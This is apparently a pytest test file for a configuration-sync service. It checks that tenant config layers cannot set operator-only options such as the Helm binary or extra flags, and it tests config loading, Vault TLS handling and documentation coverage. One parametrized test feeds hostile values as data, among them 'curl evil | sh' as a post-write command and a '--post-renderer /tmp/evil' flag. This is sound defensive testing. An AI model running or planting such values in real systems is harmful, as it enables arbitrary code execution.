"""
What a layer may set is what rule.proto says it may, and nothing else.

A tenant's bundle.json (and a repository's vartrack.json) used to be checked with a
deny-list built from the datasource mapping table: a key was reserved to config.cue
only if it happened to be in the table. A sink option the table forgot was settable by
a tenant, which is how `helm_extra_flags` ran a program of the tenant's choosing.
Now only declared, settable options pass, and the rest is dropped with a warning that
names it.
"""
from __future__ import annotations

import logging

import pytest

from app import config_validator
from app.pipeline import datasource_settings as ds
from app.pipeline import rule_layers, rule_options
from app.pipeline.rule_layers import layered_rule

CUE = {
    "platforms": [{"gitea": {"endpoint": "http://gitea:3000/"}}],
    "datasources": [{"helm": {"tag": "prod", "namespace": "shop", "release_name": "shop",
                              "chart_name": "./chart", "extra_flags": ["--timeout", "10m"],
                              "values_file_path": "values/prod.yaml"}}],
    "rules": [
        {"platform": "gitea", "datasource": "helm-prod", "repositories": ["acme/configs"], "file_name": "app.yaml"},
    ],
}
RULE = CUE["rules"][0]


@pytest.fixture(autouse=True)
def cue(monkeypatch):
    rule_layers._warned.clear()
    monkeypatch.setattr(ds, "_bundle", lambda: CUE)


def tenant(**keys):
    return layered_rule(RULE, {"platform": "gitea", "datasource": "helm-prod", **keys}, "acme")


@pytest.mark.parametrize("key,value", [
    ("helm_binary", "/tmp/evil"),
    ("helm_extra_flags", ["--post-renderer", "/tmp/evil"]),
    ("helm_values_file_path", "/etc/cron.d/x"),
    ("token", "stolen"),
    ("post_write_commands", ["curl evil | sh"]),
    ("mongo_uri", "mongodb://evil/"),
    ("a_key_nobody_declared", 1),
])
def test_a_tenant_cannot_set_what_runs_a_program_reaches_a_destination_or_is_undeclared(key, value, caplog):
    with caplog.at_level(logging.WARNING):
        rule = tenant(**{key: value})
    assert key not in rule
    assert key in caplog.text and "ignored" in caplog.text


def test_the_operators_helm_settings_come_from_the_datasource_block_alone():
    from app.pipeline.sinks.settings import for_rule

    rule = tenant(helm_extra_flags=["--post-renderer", "x"], extra_flags=["--post-renderer", "x"])
    assert "helm_extra_flags" not in rule and "extra_flags" not in rule
    settings = for_rule(rule)
    assert settings.kind == "helm" and settings.name == "helm-prod"
    assert settings.get("extra_flags") == ["--timeout", "10m"]
    assert settings.get("values_file_path") == "values/prod.yaml"


def test_a_field_the_datasource_proto_does_not_declare_cannot_be_read():
    from app.pipeline.sinks.settings import Settings

    with pytest.raises(AttributeError, match="helm_extra_flags"):
        Settings.of("helm").get("helm_extra_flags")
    with pytest.raises(AttributeError):
        Settings.of("helm", helm_binary="/tmp/evil")


def test_the_declared_options_a_tenant_may_set_pass():
    rule = tenant(key_format="dot", helm_values_mode="file", env_as_filename=False, s3_tag_keys=["team"],
                  branch_map={"develop": "staging"}, repo_url="https://git/acme/configs.git", description="a note")
    assert rule["key_format"] == "dot" and rule["helm_values_mode"] == "file" and rule["env_as_filename"] is False
    assert rule["s3_tag_keys"] == ["team"] and rule["branch_map"] == {"develop": "staging"}
    assert rule["repo_url"] == "https://git/acme/configs.git"
    assert "description" not in rule  # a note, read by no layer


def test_one_warning_names_every_key_dropped_and_says_which_config_cue_reserves(caplog):
    with caplog.at_level(logging.WARNING):
        tenant(self_heal=False, helm_binary="x", helm_extra_flags=[])
    text = caplog.text
    assert "self_heal" in text and "only config.cue sets" in text
    # helm_extra_flags is no rule option and no datasource field: undeclared, like helm_binary.
    assert "helm_binary, helm_extra_flags" in text and "not options a tenant may set" in text


def test_the_validator_reports_what_a_sync_would_drop(monkeypatch):
    from app.schema_registry import manager
    monkeypatch.setattr(manager, "get_schema_manager", lambda: type("M", (), {"registration": lambda self, t: {}})())
    result = config_validator.Result()
    config_validator._bundle({"rules": [{"platform": "gitea", "datasource": "helm-prod", "helm_binary": "x",
                                         "key_format": "dot"}]}, "bundle.json", "acme", result)
    assert any("helm_binary" in w and "not an option" in w for w in result.warnings)
    assert not any("key_format" in w for w in result.warnings)


# ── the programs a sink runs are the operator's ───────────────────────────────

def test_a_rule_cannot_pick_the_helm_binary(monkeypatch):
    from app.pipeline.sinks.strategies.helm import get_strategy
    monkeypatch.setenv("HELM_BINARY", "/opt/operator/helm")
    from app.pipeline.sinks.settings import Settings
    strategy = get_strategy("upgrade", Settings.of("helm"), {"helm_binary": "/tmp/evil"})
    assert strategy._helm == "/opt/operator/helm"


def test_the_helm_options_the_proto_declares_for_the_operator_are_not_rule_options():
    for key in ("extra_flags", "values_file_path"):
        assert key not in rule_options.FIELDS


# ── one reading of config.cue ─────────────────────────────────────────────────

import json
import pathlib
import shutil
import subprocess
import types

from app import config as app_config

REPO = pathlib.Path(__file__).resolve().parents[3]


def _run(stdout="{}", returncode=0, stderr=""):
    return lambda *a, **k: types.SimpleNamespace(stdout=stdout, returncode=returncode, stderr=stderr)


@pytest.fixture
def binary(monkeypatch):
    monkeypatch.setenv("VARTRACK_BUNDLE_BINARY", "/opt/vartrack-bundle")


def test_the_bundle_is_what_vartrack_bundle_prints(binary, monkeypatch):
    bundle = {"platforms": [{"gitea": {"endpoint": "http://gitea:3000"}}], "rules": []}
    monkeypatch.setattr(app_config.subprocess, "run", _run(json.dumps(bundle)))
    assert app_config._load_cue_bundle("config.cue") == bundle


def test_a_config_the_gateway_refuses_is_refused_here_with_its_reason(binary, monkeypatch):
    monkeypatch.setattr(app_config.subprocess, "run",
                        _run(returncode=1, stderr="failed to unmarshal into protobuf: unknown field \"not_a_setting\""))
    with pytest.raises(app_config.BundleError, match="not_a_setting"):
        app_config._load_cue_bundle("config.cue")


def test_a_bundle_these_protos_do_not_accept_is_a_mismatched_install(binary, monkeypatch):
    monkeypatch.setattr(app_config.subprocess, "run", _run(json.dumps({"rules": [{"not_in_these_protos": 1}]})))
    with pytest.raises(app_config.BundleError, match="same release"):
        app_config._load_cue_bundle("config.cue")


def test_without_the_program_there_is_no_silent_empty_bundle(monkeypatch):
    monkeypatch.delenv("VARTRACK_BUNDLE_BINARY", raising=False)
    monkeypatch.setattr(app_config.shutil, "which", lambda name: None)
    with pytest.raises(app_config.BundleError, match="vartrack-bundle"):
        app_config._load_cue_bundle("config.cue")


def test_a_bundle_that_cannot_be_re_read_keeps_the_last_good_one_and_says_so(binary, monkeypatch, caplog):
    monkeypatch.setattr(app_config.subprocess, "run", _run(returncode=1, stderr="broken"))
    with caplog.at_level(logging.ERROR):
        assert app_config.load_bundle("config.cue", {"rules": ["kept"]}) == {"rules": ["kept"]}
    assert "broken" in caplog.text


def test_sign_in_stays_closed_when_config_cue_cannot_be_read(binary, monkeypatch):
    # An empty bundle has no ui.auth, which would leave the web UI open to everyone.
    # (app.config is reloaded by other tests, so what the code under test sees is looked up now.)
    from app.ui import sessions
    monkeypatch.setattr("app.config.settings.CONFIG_PATH", "config.cue")
    monkeypatch.setattr("app.config.subprocess.run", _run(returncode=1, stderr="broken"))
    with pytest.raises(sessions.AuthConfigError, match="cannot be loaded"):
        sessions._cue_bundle()


def test_no_service_starts_on_a_config_it_cannot_read_unless_told_it_may(binary, monkeypatch):
    from app import dependencies

    dependencies.reset()
    monkeypatch.setattr(app_config.subprocess, "run", _run(returncode=1, stderr="broken"))
    monkeypatch.setattr(app_config._Settings, "CONFIG_PATH", str(REPO / "e2e" / "config.cue"))
    monkeypatch.setenv("MTLS_ENABLED", "false")
    monkeypatch.delenv("VARTRACK_ALLOW_DEGRADED", raising=False)
    for env in ("production", "development"):
        monkeypatch.setattr(app_config._Settings, "APP_ENV", env)
        with pytest.raises(app_config.BundleError):
            app_config._Settings()
    # an operator who names the mode gets a service that says so, loudly, for as long as it is on
    monkeypatch.setenv("VARTRACK_ALLOW_DEGRADED", "config")
    monkeypatch.setattr(app_config._Settings, "APP_ENV", "development")
    app_config._Settings()
    assert "config" in dependencies.active_modes()
    assert dependencies.snapshot()["config.cue"]["state"] == "unavailable"
    # …and never in production
    monkeypatch.setattr(app_config._Settings, "APP_ENV", "production")
    with pytest.raises(app_config.BundleError):
        app_config._Settings()
    dependencies.reset()


def test_a_config_path_that_does_not_exist_is_not_skipped(monkeypatch):
    monkeypatch.setattr(app_config._Settings, "CONFIG_PATH", "/nowhere/config.cue")
    monkeypatch.setattr(app_config._Settings, "APP_ENV", "development")
    monkeypatch.setenv("MTLS_ENABLED", "false")
    monkeypatch.delenv("VARTRACK_ALLOW_DEGRADED", raising=False)
    with pytest.raises(app_config.BundleError, match="does not exist"):
        app_config._Settings()


def test_an_unreadable_config_cue_on_the_first_read_is_an_error_not_an_empty_bundle(monkeypatch):
    from app import dependencies

    dependencies.reset()
    monkeypatch.setattr(app_config, "_load_cue_bundle",
                        lambda path: (_ for _ in ()).throw(app_config.BundleError("vartrack-bundle failed")))
    with pytest.raises(dependencies.BundleUnavailable, match="vartrack-bundle failed"):
        app_config.load_bundle("/etc/config.cue")
    assert dependencies.snapshot()["config.cue"]["state"] == "unavailable"


def test_a_later_unreadable_config_cue_keeps_the_last_good_bundle_and_says_stale(monkeypatch):
    from app import dependencies

    dependencies.reset()
    good = {"rules": [{"platform": "github"}]}
    monkeypatch.setattr(app_config, "_load_cue_bundle",
                        lambda path: (_ for _ in ()).throw(app_config.BundleError("bad edit")))
    assert app_config.load_bundle("/etc/config.cue", good) is good
    status = dependencies.snapshot()["config.cue"]
    assert status["state"] == "stale" and "bad edit" in status["reason"]
    monkeypatch.setattr(app_config, "_load_cue_bundle", lambda path: good)
    app_config.load_bundle("/etc/config.cue", good)
    assert dependencies.snapshot()["config.cue"]["state"] == "ok"
    dependencies.reset()


def _built_binary() -> str:
    found = shutil.which("vartrack-bundle") or next(
        (str(p) for p in (pathlib.Path("c:/tmp/gotest/vartrack-bundle.exe"),) if p.exists()), "")
    return found


@pytest.mark.skipif(not _built_binary(), reason="vartrack-bundle is not built")
def test_the_demo_stacks_configs_load_through_the_real_program_and_these_protos(monkeypatch):
    monkeypatch.setenv("VARTRACK_BUNDLE_BINARY", _built_binary())
    for name in ("e2e/config.cue", "e2e/live/config.cue"):
        bundle = app_config._load_cue_bundle(str(REPO / name))
        assert bundle["rules"] and bundle["datasources"]


@pytest.mark.skipif(not _built_binary(), reason="vartrack-bundle is not built")
def test_a_typo_is_refused_through_the_real_program(monkeypatch, tmp_path):
    monkeypatch.setenv("VARTRACK_BUNDLE_BINARY", _built_binary())
    path = tmp_path / "config.cue"
    path.write_text('bundle: {rules: [{platform: "gitea", datasource: "mongo", not_a_setting: true}]}\n')
    with pytest.raises(app_config.BundleError, match="not_a_setting"):
        app_config._load_cue_bundle(str(path))


# ── what a TLS field means is the same in both languages ──────────────────────

PEM = "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n"


def _verify(**kw):
    from app.utils.vault_client import VaultClient
    client = VaultClient.__new__(VaultClient)
    return client, VaultClient._verify_argument(client, kw.get("insecure_skip_verify", False),
                                                kw.get("ssl_ca"), kw.get("ssl_ca_file"))


def test_a_vault_is_verified_unless_told_otherwise_as_in_the_gateway():
    assert _verify()[1] is True
    assert _verify(insecure_skip_verify=True)[1] is False


def test_a_vault_ca_given_as_content_is_written_to_a_private_file_and_removed(tmp_path):
    client, path = _verify(ssl_ca=PEM)
    assert pathlib.Path(path).read_text(encoding="utf-8") == PEM
    import os
    if os.name == "posix":
        assert pathlib.Path(path).stat().st_mode & 0o077 == 0
    import gc
    del client
    gc.collect()
    assert not pathlib.Path(path).exists()


def test_a_vault_ca_file_is_used_as_it_is():
    assert _verify(ssl_ca_file="/etc/ssl/ca.pem")[1] == "/etc/ssl/ca.pem"


def test_a_vault_ca_is_content_or_a_file_never_both_or_the_wrong_one():
    with pytest.raises(ValueError, match="not both"):
        _verify(ssl_ca=PEM, ssl_ca_file="/etc/ssl/ca.pem")
    with pytest.raises(ValueError, match="ssl_ca_file"):
        _verify(ssl_ca="/etc/ssl/ca.pem")  # a path where content belongs


# ── a datasource field is read, or says why it is not ─────────────────────────

import re

from app.pipeline import datasource_fields

SINKS = REPO / "orchestrator-service" / "app" / "pipeline" / "sinks"
# What a sink is built from is a Settings named s or settings; what it reads is s.get("field"), …
_READ = re.compile(r"\b(?:s|settings)\.(?:get|secret|seconds|has|raw)\(\s*[\"'](\w+)[\"']")
_FILES = {"helm": ("helm.py", "strategies/helm/__init__.py")}


def _sink_files(kind: str) -> list[pathlib.Path]:
    return [SINKS / f for f in _FILES.get(kind, (f"{kind}.py",))]


def _read_by_the_sink(kind: str) -> set[str]:
    """The fields the sink of *kind* reads from its settings, by name, in its own source."""
    return {name for path in _sink_files(kind) if path.exists()
            for name in _READ.findall(path.read_text(encoding="utf-8"))}


def _go_getters() -> set[str]:
    """Every proto getter a Go service calls (GetHosts, …), outside generated code and tests."""
    found: set[str] = set()
    for sub in ("gateway-service", "watcher-service", "libs/go"):
        for path in (REPO / sub).rglob("*.go"):
            name = path.as_posix()
            if "/gen/" in name or name.endswith("_test.go"):
                continue
            found |= set(re.findall(r"\.Get(\w+)\(\)", path.read_text(encoding="utf-8", errors="ignore")))
    return found


def _camel(name: str) -> str:
    return "".join(part.capitalize() for part in name.split("_"))


def _datasource_messages():
    from vartrack.v1.models import datasource_pb2
    return [(f.name, f.message_type) for f in datasource_pb2.DataSource.DESCRIPTOR.fields if f.message_type is not None]


def _read_by_some_service(kind: str, message) -> set[str]:
    seen, go = _read_by_the_sink(kind), _go_getters()
    return {f.name for f in message.fields if f.name in seen or _camel(f.name) in go}


def test_every_kind_has_a_sink_whose_source_is_scanned():
    from app.pipeline.sinks import SINK_REGISTRY
    for kind, _ in _datasource_messages():
        if kind in SINK_REGISTRY:
            assert all(p.exists() for p in _sink_files(kind)), kind
            assert _read_by_the_sink(kind), f"the scan finds nothing the {kind} sink reads"


def test_a_sink_reads_only_fields_its_datasource_declares():
    """A name the proto does not declare would raise when read; this says so before a sync does."""
    from app.pipeline.sinks import SINK_REGISTRY
    undeclared = {}
    for kind, message in _datasource_messages():
        if kind not in SINK_REGISTRY:
            continue
        wrong = sorted(_read_by_the_sink(kind) - {f.name for f in message.fields})
        if wrong:
            undeclared[kind] = wrong
    assert not undeclared, f"read by a sink, not declared by its datasource proto: {undeclared}"


def test_every_datasource_field_is_read_by_a_service_or_says_why_not():
    unexplained = {}
    for kind, message in _datasource_messages():
        read = _read_by_some_service(kind, message)
        said = datasource_fields.UNUSED.get(kind, {})
        missing = sorted(f.name for f in message.fields if f.name != "tag" and f.name not in read and f.name not in said)
        if missing:
            unexplained[kind] = missing
    assert not unexplained, (
        f"declared in a datasource proto, read by no service and not explained: {unexplained}. A field a config.cue "
        "can set must reach a sink; if the sink does not take it yet, say so with (vartrack.v1.config).unused_reason "
        "on the field, so that setting it is reported instead of silently dropped")


def test_no_field_claims_to_be_unused_that_a_service_now_reads():
    stale = {}
    for kind, message in _datasource_messages():
        read = _read_by_some_service(kind, message)
        now_read = sorted(n for n in datasource_fields.UNUSED.get(kind, {}) if n in read)
        if now_read:
            stale[kind] = now_read
    assert not stale, f"take unused_reason off these, they are read now: {stale}"


def test_setting_a_field_no_sink_reads_is_said_once(caplog):
    from app.pipeline.sinks import settings as sink_settings

    datasource_fields._warned.clear()
    bundle = {"datasources": [{"mongo": {"tag": "primary", "endpoint": "mongodb://m", "replica_set": "rs0",
                                         "database": "d"}}]}
    with caplog.at_level(logging.WARNING):
        assert sink_settings.load("mongo-primary", {}, bundle) is not None
        sink_settings.load("mongo-primary", {}, bundle)
    lines = [r.message for r in caplog.records if "replica_set" in r.message]
    assert len(lines) == 1 and "no effect" in lines[0] and "mongo-primary" in lines[0]
    assert "database" not in caplog.text


def test_the_s3_prefix_as_env_the_docs_describe_is_reported_not_swallowed():
    assert "prefix_as_env" in datasource_fields.UNUSED["s3"]


# ── every variable the orchestrator reads is in the reference ─────────────────

def _variables_read() -> dict[str, set[str]]:
    import ast
    readers = {"os.getenv", "os.environ.get", "getenv", "_secret_env", "os.environ.setdefault"}
    found: dict[str, set[str]] = {}
    for path in (REPO / "orchestrator-service" / "app").rglob("*.py"):
        if "generated" in path.parts:
            continue
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            name = None
            if (isinstance(node, ast.Call) and node.args and isinstance(node.args[0], ast.Constant)
                    and isinstance(node.args[0].value, str) and ast.unparse(node.func) in readers):
                name = node.args[0].value
            elif (isinstance(node, ast.Subscript) and ast.unparse(node.value) == "os.environ"
                  and isinstance(node.slice, ast.Constant) and isinstance(node.slice.value, str)):
                name = node.slice.value
            if name and re.fullmatch(r"[A-Z][A-Z0-9_]+", name):
                found.setdefault(name, set()).add(path.name)
    return found


def test_every_environment_variable_the_orchestrator_reads_is_in_the_reference():
    reference = (REPO / "docs" / "reference" / "environment-variables.md").read_text(encoding="utf-8")
    prefixes = set(re.findall(r"`([A-Z][A-Z0-9_]*_)\*`", reference))   # e.g. `OTEL_TLS_*`
    missing = {name: sorted(files) for name, files in _variables_read().items()
               if name not in reference and not any(name.startswith(p) for p in prefixes)}
    assert not missing, f"read by the orchestrator, not in docs/reference/environment-variables.md: {missing}"


def test_the_orchestrators_listen_address_is_not_the_name_the_other_services_dial_with(monkeypatch, caplog):
    import importlib
    monkeypatch.setenv("ORCHESTRATOR_HTTP_ADDR", "0.0.0.0:9000")
    monkeypatch.setenv("ORCHESTRATOR_ADDR", "orchestrator-api:50051")  # what the gateway dials with
    monkeypatch.setenv("MTLS_ENABLED", "false")
    module = importlib.reload(importlib.import_module("app.config"))
    try:
        assert (module.settings.HOST, module.settings.PORT) == ("0.0.0.0", 9000)
    finally:
        monkeypatch.undo()
        importlib.reload(importlib.import_module("app.config"))
